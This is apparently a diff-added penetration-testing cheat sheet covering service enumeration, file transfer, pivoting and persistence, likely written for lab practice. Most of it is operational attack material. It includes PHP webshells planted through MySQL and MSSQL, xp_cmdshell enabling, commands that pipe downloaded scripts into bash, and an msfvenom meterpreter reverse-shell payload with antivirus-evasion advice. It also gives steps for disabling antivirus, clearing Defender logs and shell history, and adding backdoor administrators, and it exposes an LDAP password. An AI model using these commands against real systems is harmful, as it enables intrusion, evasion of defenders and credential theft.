+						-Should show TLS version
+
+		6.) IMAP cmd syntax:	see resources; search /IMAP or /imap
+					see pictures in Footprinting directory, IMAP_POP3 section
+					* FETCH 1 (BODY[n]) where n is an integer
+						-this should display contents of email body; increase n to get more info; may use 0
+
+		7.) Commands		See IMAP and POP3 folder in footprinting
+					USER [username] ---> if response is OK then user may exist
+
+	I. MySQL
+		1.) Ports:		3306
+
+		2.) mysql		command
+					syntax:
+						-mysql -u [user] -p[pwd]-h [IP]
+						-no space between -p and pwd
+
+		3.)DBs of note:		information_schema
+						-retrieved from system schema
+					system_schema
+						-contains info needed for management
+		4.)Metasploit		tool
+						-search mysql enumeration
+						-use number associated with 'enumeration module'
+
+		5.) Windows		mysql.exe -u [user] -p[password] -h [IP]
+
+		6.) dbeaver		Multiplatform database client
+					https://github.com/dbeaver/dbeaver
+
+		7.) Commands		Write data into a file with a user who has the FILE privilege:
+					--------------------------------------------------------------
+					SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+					Then use '?c=' parameter followed by system command 
+
+					Secure_file_priv system variable settings with description:
+					-----------------------------------------------------------
+					show variables like "secure_file_priv";
+					
+					Variable Name		Value			Description
+					-------------		-----			-----------
+					secure_file_priv				Has no effect on privs; server accepts read and write actions
+								(Directory name)	Export/Import operations limited to (Directory Name)
+								NULL			Import/Export operations disabled
+
+					If default read access denied is removed, read files with:
+					----------------------------------------------------------
+					select LOAD_FILE("/etc/passwd");
+					
+
+	J. MSSQL(Microsoft SQL)		
+		1.) Port(default)	1433
+
+		2.) Enumeration:	nmap
+						-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,
+						ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes 
+						--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER 
+						-sV -p [port] [IP]
+
+					Metasploit
+						-search 'mssql ping'
+						-use relevant option
+
+		3.) MSSQLClient		Interact with remote database via:
+						-/usr/share/doc/python3-impacket/examples/mssqlclient.py -port [port#] user@[IP]
+							.//username doesn't work for Windows authentication
+
+					T-SQL commands:
+						-https://docs.microsoft.com/en-us/sql/t-sql/language-reference?view=sql-server-ver16]
+
+					sqsh -S IP -U username -P password
+						-for Linux client
+						-h flag turns off column headers
+					https://www.youtube.com/watch?v=gU6iQP5rFMw <--- using dbeaver to connect to MSSQL
+					
+		4.) SQLcmd Windows	sqlcmd -S [IP] -U [username] -P [password]
+						-See 'Resources' for SQLcmd info
+
+					sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+						-y flags make terminal output neater; reduced performance
+
+		5.) Choosing Auth	Syntax for Local account:
+					-------------------------
+					sqsh -S [IP] -U .\\user -P 'pass' -h
+						-may require variation ---> SERVERNAME\\user
+
+					Default authenticates against users in SQL server
+
+		6.) Commands		SELECT name FROM master.dbo.sysdatabases
+
+					Select database
+					---------------
+					USE databasename
+					GO
+
+					Show Tables
+					-----------
+					SELECT table_name FROM [databasename].INFORMATION_SCHEMA.TABLES
+					GO
+
+					Select all data from table 'users'
+					----------------------------------
+					SELECT * FROM users
+					go
+
+					System Commands from Service Interface with Service Privileges:
+					---------------------------------------------------------------
+					xp_cmdshell 'whoami'
+					GO
+						-note! May NOT need quotes
+
+					If xp_cmdshell is disabled, perform the following from within MSSQL:
+					--------------------------------------------------------------------
+					-- To allow advanced options to be changed.  
+					EXECUTE sp_configure 'show advanced options', 1;  
+					GO  
+					-- To update the currently configured value for advanced options.  
+					RECONFIGURE;  
+					GO  
+					-- To enable the feature.  
+					EXECUTE sp_configure 'xp_cmdshell', 1;  
+					GO  
+					-- To update the currently configured value for this feature.  
+					RECONFIGURE;  
+					GO
+
+					Enable Ole Automation Procedures in order to write to files via MSSQL:
+					----------------------------------------------------------------------
+					sp_configure 'show advanced options', 1
+					GO
+					RECONFIGURE
+					GO
+					sp_configure 'Ole Automation Procedures', 1
+					GO
+					RECONFIGURE
+					GO
+
+					Create a file:
+					--------------
+					DECLARE @OLE INT
+					DECLARE @FileID INT
+					EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+					EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+					EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+					EXECUTE sp_OADestroy @FileID
+					EXECUTE sp_OADestroy @OLE
+					GO
+
+					Read any file in the system that the account has read access to:
+					----------------------------------------------------------------
+					SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+					GO
+
+					Might have to drop the 'N'
+
+		7.) Lateral Movement	If MSSQL server is 'linked', lateral movement can be done via the server instance; move from
+					one server to another. Admins configure this using the remote server to link to.
+
+					Identify linked Servers in MSSQL(1=Server is Remote; 0=Server is Linked):
+					---------------------------------
+					SELECT srvname, isremote FROM sysservers
+					GO
+
+					Check if remote server user has sysadmin privs(double quotes needed for remote server communication):
+					-----------------------------------------------------------------------------------------------------
+					EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+	
+	K. IPMI(Intelligent Platform Management Interface)
+		1.) Port:		623/UDP by default
+
+		2.) Enumeration:		nmap
+						sudo nmap -sU --script ipmi-version -p [port] [ip
+					metasploit
+						-search 'ipmi version'
+
+		3.) Exploitations:	BMCs use a webbased concole similar to telnet/ssh;
+						-if exploited, may give access to a remote terminal
+					HASHed passwords can be acquired through packets due to IPMIs low authentication security configurations
+
+		4.) HASH cracking	metasploit
+						-search 'ipmi dump hashes'
+						-this framework can extract the hash of a users password through packets
+					HP iLO BMC 
+						-If the printer uses a default password, try the below command with the hash in ipmi.txt
+						-hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+		5.) Using Password	If password doesn't give access to IPMI, then;
+						-keep it stored;
+						-pwd may be used on other hosts/services on the network
+
+		6.) Interation:		ipmitool
+						-acquire via github, see Backupscripts.txt in documents
+
+	L. SSH(Secure Shell)	
+		1.) Enum script:	ssh-audit.py
+						-show encryption algorithims that are used by the client and server.
+						-can be used to attack server/client at cryptographic level
+					ssh
+						-ssh with verbose output (-v) can show which auth methods are used.
+					ssh
+						-option		-o	gives options in the format of ssh/sshd_config files
+						-ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
+
+	M. RDP(Remote Desktop Protocol)
+		1.) Enumeration		port	3389
+					nmap
+						-nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
+						-be cautious with above script option because the cookie '=nmap' may be forged in ASCII 
+							.this is then sent to the server, whos EDR system may trigger a lockout(IP block via firewall)
+					./rdp-sec-check.pl [IP]
+						-located in Enumerationscripts/Windows
+						-checks RDP server port 3389 for configurations via handshakes; NEEDS to complete TCP connection(SYNACK)
+						-might show if encryption is required and what kind
+
+					scanner/rdp/rdp_scanner <---Metasploit module
+
+		2.) Interation		xfreerdp
+						-linux terminal tool used to connect to windows hosts via RDP
+						-offers access to remote desktop
+						-syntax
+							xfreerdp /u:username /v:IP /p:pwd
+					rdesktop [server]:port
+					Remmina
+
+		3.) Psw Cracking	hydra
+						-this tool can be used with a user name and password list 
+						-see above; '/hydra'
+
+	N. WinRM(Windows Remote Management)
+		1.) Ports		5985tcp and 5986/tcp, HTTP/HTTPS respectively
+
+		2.) Enumeration		nmap
+						-nmap -sV -sC [IP] -p5985,5986 --disable-arp-ping -n
+						-5985 is usually used over 5986(HTTPS); possible misconfiguration
+		3.) Interaction		evil-winrm
+						-syntax:	evil-winrm -i host -u username -p pwd 
+						-check Resources directory for list of options
+
+	O. Windows Management Instrumentation(WMIC)
+		1.) Ports		445 and 135 tcp
+
+		2.) Interaction		/usr/share/doc/python3-impacket/examples/wmiexec.py user:pwd@host
+						-if password doesn't work in bash, exclude it; may get prompted automatically
+						-allows connection to the target using credentials
+					https://github.com/Hackplayers/evil-winrm <-----------------has list of options
+
+	P. LDAP(Lightweight Directory Access Protocol)
+		1.) Ports		389,636,3268,3269
+	
+		2.) Tool		ldapsearch -x -H ldap://[IP] -s base namingcontexts <----works if auth isn't needed
+						-should show records such as domain controller name
+					https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/
+
+					windapsearch <--- https://github.com/ropnop/windapsearch
+					
+
+		3.) Enumeration		ldapsearch -x -b "DC=subdomain,DC=TLD" -H ldap://IP -D "domain\user" -W "objectclass=*"
+						-searches ALL objects within tree
+					ldapsearch -x -H ldap://[IP] -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB"
+						-searches USERS within tree
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+VII. TRANSFERING FILES
+	A. TRANSFERRING FILES(downloads)
+		1. curl or wget:		see Resources directory for 'Various' webservers
+						command	python3 -m http.server 8000 
+						then go to remote host/target
+						command	wget [host]:[port]/filename	
+							.note, first step should ensure file is in same directory, therefor no path should be required
+							.host might be IP			
+						-if wget isn't available on remote/target host:
+							.command	curl [host]:[port}/filename -o [enter name you want for the target location]
+
+		2. SSH:				scp [local file/path] [user]@[IP/host]:/[remote directory]/[filename]
+							-note this uses an SSH connection; thats why credentials are needed
+							-SSH keys might also be used
+
+		3. BASE64		 	can be used in event where firewall prevents file transfers
+							-command:	base64 [options] [filename]
+							-copy output
+							-echo [paste] | base64 -d > [file]
+
+		4.) Python			python -m uploadserver
+							-can be acquired via pip3 install uploadserver
+						THE FOLLOWING GETS FILE FROM REMOTE URL:
+						python 2.7 -c 'import urlib ; urllib.urlretrieve ("desired file url", "name to give file locally")'
+						python3 -c 'import urllib.request ; urllib.request.urlretrieve("desired file url","name to give file 
+						locally")'
+
+						python FTP server:
+							-sudo pip3 install pyftpdlib
+							-sudo python3 -m pyftpdlib --port 21
+						
+						python SMB file transfer:
+							-sudo impacket-smbserver share -smb2support /tmp/smbshare <--- replace 'share' with desired name 
+								.replace /tmp/smbshare with actual path with desired file
+						smbserver.py -smb2support share-name /localDirectory/
+
+		5.) PHP				Below can download files from a url and write to disk
+						php -r '$file = file_get_contents("desired file url") ; file_put_contents("local file name",$file);'
+						php -r 'const BUFFER = 1024 ; $fremote = fopen("deseired file url", "rb");
+						$flocal = fopen("local file name", "wb"); 
+						while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+						FileLESS; BELOW CAN DOWNLOAD FILE AND PIPE TO BASH:
+						php -r '$lines = @file("desired file url"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+							-@file can be an alias for the file name if 'fopen wrappers' have been enabled
+
+		6.) Ruby			ruby -e 'require "net/http" ; File.write("Local file name", Net::HTTP.get(URI.parse(desired url file)))'
+
+		7.) Perl			perl -e 'use LWP::Simple; getstore("desired file url", "local file name");'
+			
+		8.) JavaScript			See 'PS' in Resources
+
+		9.) (FTP)File Transfer ALL	Download all files from server from local terminal
+				                        -command        wget -m --no-passive ftp://user@host    
+								.might be user:user@host, or maybe this is user:pwd@host
+
+		10.) Fileless Transfer		curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+							-pipes content in script through bash shell, thus executing it without using a file on disk
+						wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+						/dev/tcp
+							-exec 3<>/dev/tcp/[target IP]/port
+							-echo -e "GET /filename HTTP/1.1\n\n">&3
+							-cat <&3
+
+	B. Uploads
+		1.) Python			FTP file UPLOADS
+							-see 'python FTP server'
+								.add write privileges with '--write' at the end of command
+						python3 -c 'import requests;requests.post("http://host/upload",files={"files":open("file path","rb")})'
+							-uploads file to remote server
+	
+
+		5.) WebDav.WebDav		may allow uploads while in target via SMB
+						Create server with sudo wsgidav --host=IP --port=port --root=/tmp --auth=anonymous
+						then see PS commands
+
+
+	C. Secure File Transfers		scp name@host/filepath . <----copies file via SSH to current directory ; similar syntax to copy
+
+						HTTPS file transfer	 <----works with uploading to local machine; perform following in local host
+							-openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj 
+							 '/CN=server'							
+							-start the server in a seperate directory:
+							python3 -m uploadserver 443 --server-certificate [full path to key/cert]
+						HTTPS file transfer	<----perform following in target host in order to transfer file
+							curl -X POST https://[local host]/upload -F 'files=@[path to file]' --insecure
+
+		1.) RDP Data Transfer		Mounting:
+						rdesktop [IP] -d [domain] -u user -p 'pass' -r disk:linux='path to directory for mounting'
+						xfreerdp /v:IP /d:domain /u:user /p:'pass' /drive:linux,/home/path to directory to mount
+							-then on target machine, go to 'Network' in file explorer, then look for '\\tsclient\linux'
+						
+	D. VALIDATING FILE TRANSFERS		Utilize command	file [file]	to ensure file integrity before/after transfer
+						Also utilize command		md5sum [file]	on local file
+							-then	md5sum [file] at target location 
+							-hash should match; if it does, integrity should be ok
+
+	E. ENCRYPTING FILE TRANSFERS		Scripts:
+							Invoke-AESEncryption.ps1 <----for powershell. See Scripts directory.
+						OpenSSL(using password encryption)
+							openssl enc -[algo type] -iter [num] -pbkdf2 in [path to desired file] -out [new encrypted file]
+						OpenSSL(Password decryption)
+							-use same command from above; use -d after enc and swap 'in' arg with 'out' arg; new 'out' can be
+							 custom
+
+	F. Creating an HTTPS server(nginx)	Provides file uploads
+						sudo mkdir -p /var/www/uploads/Squirrels
+						sudo chown -R www-data:www-data /var/www/uploads/Squirrels
+						Create Nginx Config File(see /etc/nginx/sites-available/Squirrels.conf)
+						sudo ln -s /etc/nginx/sites-available/Squirrels.conf /etc/nginx/sites-enabled
+						sudo systemctl restart nginx.service
+						sudo systemctl restart nginx.service
+						curl -T localfile https://host/Squirrels/newremotefile --insecure
+
+	G. Living off the land			https://gtfobins.github.io/ <----linux
+						Example; using openssl(generally available in linux distros):
+							-SERVER:
+							-openssl s_server -accept [port] -cert [certifacte path] -key [keypath] < [file to extract]
+							-CLIENT:
+							-openssl s_client -connect [IP:port] -quiet > [custom filename to dump contents]
+
+	H. Bypassing API File Filters		Utilize API*.txt in 'Resources/Web' Directory
+							-contains format to use to transfer file
+							-Change content type to match servers expectation
+
+	I. Bypassing Microsoft Defender(AV)	The following payload can be TRANSFERED TO TARGET(Windows 10 home 19044) when zipped with a password:
+
+						msfvenom -a x86 -p windows/meterpreter_reverse_tcp lhost=10.0.0.214 lport=81 -k -x template_x86_windows.exe
+						-e x86/shikata_ga_nai --platform windows -f exe -o template_windows.exe -i 10
+
+							-Doesn't need to be encoded; a zip folder with password suffices
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+VIII. Pivoting and Persistence
+						Pivoting Methodology(See Pivoting Notes for greater details):
+						-------------------------------------------------------------
+						Enumerate foothold
+							-credential hunt
+							-check services
+						Enumerate foothold network for possible pivot/lateral movement targets:
+							-ping sweep/arp scan ---> note hosts
+							-ip/if config        ---> note interfaces/IPs   
+							-netstat             ---> anyone else connected?
+							-RDP jacking(Brainstorming)
+						If other hosts are reachable from beachhead, AND ssh is available on beachhead, set up SOCKS proxy:
+							-ssh -D user@pivothost
+							-chisel
+							-Proxifier/SocksOverRdp
+						Scan out-of-reach target with nmap -sT(incomplete packets i.e. sA sS may not be accurate)
+						Once on the target, if a file is needed:
+							-First determine privs/groups
+							-Start from top of methadology
+							-Once next step is discovered...DISABLE AV! Or at least create a folder for AV to ignore
+							-THEN open remote file location!...AV can detect malware in mounted folders
+							-transfer file
+							-Use file to get needed data
+							-Delete file <--- Must be FAST! AV WILL turn back on automatically.
+
+	B.) Persistence				Covering your tracks:
+						---------------------
+						Go to 'Local Group Policy Editor'
+							-Go to:	Computer Configuration\Administrative Templates\Windows Components\
+								Windows Defender Antivirus\Scans
+							-Set 'Turn on removal of items from scan history folder' to enabled and desired days
+						Go to 'Event Viewer' > Applications and Services Logs > Microsoft > Windows > Windows Defender
+							-Right click 'Operational' to clear logs
+						echo ' ' > C:\Users\[user]\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+						AV triggering events:
+						---------------------
+						Mimikats and Rubeus.
+						ANY shell payload
+						ANY PS module from powershell mafia
+						ALL HASH DUMPS!!!
+
+						If SYSTEM access via webshell(or other service accounts)/exploits(EternalBlue,etc)/privesc(Juicy_Potato):
+						---------------------------------------------------------------------------------------------------------
+						net localgroup Administrators [user_whom_you_have_password_for] /add
+						Set-ItemProperty -Path HKLM:SystemCurrentControlSetControlTerminal Server-name "fDenyTSConnections" -Value 0
+						Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+							When cleaning up:
+							-----------------
+							Set-ItemProperty -Path HKLM:SystemCurrentControlSetControlTerminal Server-name "fDenyTSConnections" -Value 1
+							Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+						Do the above via cmd.exe:
+						-------------------------
+						Enable:
+						-------
+						reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+						netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+
+						Disable:
+						--------
+						reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+						netsh advfirewall firewall set rule group="remote desktop" new enable=No
+
+
+
+
+
+
+For Local Administrator Password Solution(LAPS):
+------------------------------------------------
+The following can be done to possibly read passwords from powershell session(see 'Timelapse' in retired boxes):
+upload AdmPwd.Ps <---------------------uploads module via local host directory
+Install-Module -Name AdmPwd.PS <--------might be able to install the module via internet
+Import-module AdmPwd.PS <------- once the module is uploaded, use this command to import into powershell session; may need to include FULL path to .PS file
+Get-Command *admpwd* <--- Gives list of AdmPwd.PS commands
+	-Set-AdmPwdComputerSelfPermission -Orgunit "OU=organizational unit,DC=domain,DC=TLD"
+		.Gives the typed OU write permissions to create the Admin password using LAPS
+		.https://www.youtube.com/watch?v=tMlr3evye_w <--- info on configuring laps
